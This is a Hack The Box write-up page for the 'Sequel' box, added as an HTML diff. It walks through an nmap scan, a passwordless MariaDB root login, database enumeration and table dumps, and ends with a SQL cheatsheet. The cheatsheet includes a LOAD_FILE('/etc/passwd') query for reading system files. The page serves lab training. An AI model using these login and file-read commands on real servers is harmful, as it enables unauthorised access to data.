@@ -1,0 +1,331 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>HTB: Sequel — Unauthenticated MariaDB Root to Flag</title>
+<style>
+  * { box-sizing: border-box; }
+  html { background-color: #0a0e27; }
+  body {
+    background-color: rgba(10, 14, 39, 0.9);
+    color: #e0e0e0;
+    font-family: 'Courier New', monospace;
+    max-width: 900px;
+    margin: 0 auto;
+    padding: 40px 20px;
+    line-height: 1.6;
+  }
+  /* Animated grid background */
+  .bg-animation {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    z-index: -1;
+    opacity: 0.08;
+    background:
+      linear-gradient(90deg, transparent 98%, #00ff88 100%),
+      linear-gradient(0deg, transparent 98%, #00ff88 100%);
+    background-size: 50px 50px;
+    animation: grid-flow 20s linear infinite;
+  }
+  @keyframes grid-flow {
+    0% { transform: translateY(0); }
+    100% { transform: translateY(50px); }
+  }
+  a { color: #66d9ef; text-decoration: none; }
+  a:hover { color: #00ff88; text-decoration: underline; }
+  h1 {
+    color: #00ff88;
+    text-shadow: 0 0 8px rgba(0,255,136,0.5);
+    font-size: 2.2em;
+    margin-bottom: 10px;
+  }
+  h2 {
+    color: #00ff88;
+    border-bottom: 1px solid #1a1f3a;
+    padding-bottom: 8px;
+    margin-top: 50px;
+    text-transform: uppercase;
+    letter-spacing: 1px;
+  }
+  h3 { color: #66d9ef; margin-top: 30px; }
+  .tags { margin: 15px 0 5px 0; }
+  .tag {
+    display: inline-block;
+    background: rgba(0,255,136,0.1);
+    border: 1px solid rgba(0,255,136,0.3);
+    color: #00ff88;
+    padding: 4px 12px;
+    margin-right: 8px;
+    font-size: 0.85em;
+    border-radius: 4px;
+  }
+  .tag.veasy {
+    background: rgba(199,36,255,0.2);
+    color: #c724ff;
+    border-color: #c724ff;
+  }
+  .meta { color: #888; font-size: 0.9em; margin-bottom: 30px; }
+  .meta b { color: #a0a0a0; }
+  code, pre {
+    background-color: #10152e;
+    border: 1px solid #232a4d;
+    border-radius: 4px;
+  }
+  code { padding: 2px 6px; font-size: 0.95em; color: #66d9ef; }
+  pre {
+    padding: 16px;
+    overflow-x: auto;
+    margin: 16px 0;
+    color: #b8e6c8;
+    border-left: 3px solid #00ff88;
+  }
+  pre code { border: none; padding: 0; color: inherit; background: none; }
+  .callout {
+    background: rgba(102,217,239,0.06);
+    border-left: 3px solid #66d9ef;
+    padding: 12px 18px;
+    margin: 20px 0;
+    color: #b0c4cc;
+  }
+  .callout.warn {
+    background: rgba(255,208,0,0.06);
+    border-left: 3px solid #ffd000;
+    color: #d8cfa0;
+  }
+  .divider {
+    border: none;
+    height: 1px;
+    background: linear-gradient(90deg, transparent, #00ff88, transparent);
+    margin: 40px 0;
+  }
+  ul, ol { padding-left: 22px; }
+  li { margin-bottom: 6px; }
+  .back { display: inline-block; margin-bottom: 30px; color: #66d9ef; }
+  .flag {
+    display: inline-block;
+    background: rgba(0,255,136,0.08);
+    border: 1px solid #00ff88;
+    color: #00ff88;
+    padding: 8px 16px;
+    border-radius: 4px;
+    font-size: 1em;
+    letter-spacing: 0.5px;
+  }
+  .prompt { color: #00ff88; }
+  .prompt::before { content: "$ "; }
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    margin: 16px 0;
+  }
+  th, td {
+    border: 1px solid #232a4d;
+    padding: 8px 12px;
+    text-align: left;
+  }
+  th {
+    color: #00ff88;
+    background: rgba(0,255,136,0.05);
+    text-transform: uppercase;
+    letter-spacing: 1px;
+  }
+</style>
+</head>
+<body>
+
+<div class="bg-animation"></div>
+
+<a class="back" href="index.html#writeups">&larr; Back to all writeups</a>
+
+<h1>HTB: Sequel — Unauthenticated MariaDB Root to Flag</h1>
+
+<div class="tags">
+  <span class="tag">HACKTHEBOX</span>
+  <span class="tag veasy">VERY EASY</span>
+  <span class="tag">LINUX</span>
+  <span class="tag">MARIADB</span>
+  <span class="tag">SQL ENUMERATION</span>
+</div>
+
+<div class="meta">
+  Author: th3_m4d_h4ck3r &nbsp;|&nbsp; Framework: Scarif Operations &nbsp;|&nbsp; Season 11
+</div>
+
+<h2>&gt; OVERVIEW</h2>
+
+<p>Sequel is a Very Easy Linux box built around a single misconfiguration: a
+MariaDB instance exposed on its default port with unauthenticated root access.
+No exploitation required beyond knowing basic SQL enumeration — a good refresher
+target after time away from the language.</p>
+
+<h2>&gt; RECON</h2>
+
+<p>Full TCP port sweep against the target identified MySQL/MariaDB listening on
+its default port.</p>
+
+<pre><span class="prompt">sudo nmap -sC -sV -p- --min-rate 5000 &lt;target&gt;</span>
+
+PORT     STATE SERVICE
+3306/tcp open  mysql</pre>
+
+<h2>&gt; ENUMERATION</h2>
+
+<h3>1. Root login, no password</h3>
+
+<p>First thing to try on any exposed MySQL service — and it worked.</p>
+
+<pre><span class="prompt">mysql -h &lt;target&gt; -u root</span></pre>
+
+<h3>2. Enumerate available databases</h3>
+
+<pre>MariaDB [(none)]&gt; SHOW DATABASES;
++--------------------+
+| Database           |
++--------------------+
+| htb                |
+| information_schema |
+| mysql              |
+| performance_schema |
++--------------------+</pre>
+
+<p><code>htb</code> stands out immediately as the non-default,
+application-specific database.</p>
+
+<h3>3. Select the database and list tables</h3>
+
+<pre>MariaDB [(none)]&gt; USE htb;
+MariaDB [htb]&gt; SHOW TABLES;
++---------------+
+| Tables_in_htb |
++---------------+
+| config        |
+| users         |
++---------------+</pre>
+
+<h3>4. Dump both tables</h3>
+
+<p><code>users</code> held nothing but recon-value contact info — no creds, no
+hashes. <code>config</code> was the payload.</p>
+
+<pre>MariaDB [htb]&gt; SELECT * FROM users;
++----+----------+------------------+
+| id | username | email            |
++----+----------+------------------+
+|  1 | admin    | admin@sequel.htb |
+|  2 | lara     | lara@sequel.htb  |
+|  3 | sam      | sam@sequel.htb   |
+|  4 | mary     | mary@sequel.htb  |
++----+----------+------------------+
+
+MariaDB [htb]&gt; SELECT * FROM config;
++----+-----------------------+-----------------------------------+
+| id | name                  | value                             |
++----+-----------------------+-----------------------------------+
+|  5 | flag                  | [flag captured ✅]                 |
++----+-----------------------+-----------------------------------+</pre>
+
+<h2>&gt; FLAG</h2>
+
+<div class="callout">
+<span class="flag">[flag captured ✅]</span>
+</div>
+
+<h2>&gt; REFERENCE — SQL ENUMERATION CHEATSHEET</h2>
+
+<table>
+  <tr><th>Goal</th><th>Query</th></tr>
+  <tr><td>List databases</td><td><code>SHOW DATABASES;</code></td></tr>
+  <tr><td>Select a database</td><td><code>USE &lt;db&gt;;</code></td></tr>
+  <tr><td>List tables in current db</td><td><code>SHOW TABLES;</code></td></tr>
+  <tr><td>Show columns for a table</td><td><code>DESCRIBE &lt;table&gt;;</code> / <code>SHOW COLUMNS FROM &lt;table&gt;;</code></td></tr>
+  <tr><td>Dump all rows/columns</td><td><code>SELECT * FROM &lt;table&gt;;</code></td></tr>
+  <tr><td>Find a column by name across a db</td><td><code>SELECT table_name, column_name FROM information_schema.columns WHERE table_schema='&lt;db&gt;' AND column_name LIKE '%flag%';</code></td></tr>
+  <tr><td>Search across ALL databases</td><td><code>SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE column_name LIKE '%flag%';</code></td></tr>
+  <tr><td>Check current user's grants</td><td><code>SHOW GRANTS FOR CURRENT_USER();</code></td></tr>
+  <tr><td>Read a file (if FILE priv granted)</td><td><code>SELECT LOAD_FILE('/etc/passwd');</code></td></tr>
+</table>
+
+<h2>&gt; LESSONS LEARNED</h2>
+
+<div class="callout warn">
+<b>Always check for anonymous / blank-password root before anything else.</b>
+On very easy boxes — and surprisingly often in real engagements — an exposed DB
+port with no auth enforced is the entire path. No brute force, no exploit chain,
+just <code>mysql -h &lt;ip&gt; -u root</code> and you're in.
+</div>
+
+<div class="callout">
+<b><code>information_schema.columns</code> is the fastest way to hunt for a specific
+column across an unfamiliar schema</b> — worth reaching for immediately instead
+of manually paging through every table when a db has more than a couple tables.
+</div>
+
+<hr class="divider">
+
+<p style="color:#6a7a85; font-size:0.85em;">
+Scarif Operations &nbsp;|&nbsp; th3m4dh4ck3r.com &nbsp;|&nbsp; CPTS prep, Season 11
+</p>
+
+    <!-- Matrix Rain Effect — full-page backdrop behind all content -->
+    <canvas id="matrix-rain"></canvas>
+    <script>
+        // Full-width Matrix rain rendered as a fixed backdrop across the whole
+        // page. z-index:-1 + pointer-events:none keep it strictly BEHIND the
+        // content so it never runs over text, tags, code blocks or images.
+        (function () {
+            const canvas = document.getElementById('matrix-rain');
+            const ctx = canvas.getContext('2d');
+
+            canvas.style.position = 'fixed';
+            canvas.style.top = '0';
+            canvas.style.left = '0';
+            canvas.style.zIndex = '-1';
+            canvas.style.pointerEvents = 'none';
+            canvas.style.opacity = '0.4';
+
+            const matrixChars = 'ｱｲｳｴｵｶｷｸｹｺｻｼｽｾｿﾀﾁﾂﾃﾄﾅﾆﾇﾈﾉﾊﾋﾌﾍﾎﾏﾐﾑﾒﾓﾔﾕﾖﾗﾘﾙﾚﾛﾜﾝ01234567890@#$%^&*()';
+            const fontSize = 16;
+            let drops = [];
+
+            function initColumns() {
+                const columns = Math.floor(canvas.width / fontSize);
+                drops = [];
+                for (let i = 0; i < columns; i++) {
+                    drops[i] = Math.random() * -100;
+                }
+            }
+
+            function resize() {
+                canvas.width = window.innerWidth;
+                canvas.height = window.innerHeight;
+                initColumns();
+            }
+
+            function draw() {
+                ctx.fillStyle = 'rgba(10, 14, 39, 0.05)';
+                ctx.fillRect(0, 0, canvas.width, canvas.height);
+
+                ctx.fillStyle = '#00ff88';
+                ctx.font = fontSize + 'px monospace';
+
+                for (let i = 0; i < drops.length; i++) {
+                    const char = matrixChars[Math.floor(Math.random() * matrixChars.length)];
+                    ctx.fillText(char, i * fontSize, drops[i] * fontSize);
+                    if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
+                        drops[i] = 0;
+                    }
+                    drops[i]++;
+                }
+            }
+
+            resize();
+            setInterval(draw, 50);
+            window.addEventListener('resize', resize);
+        })();
+    </script>
+
+</body>
+</html>
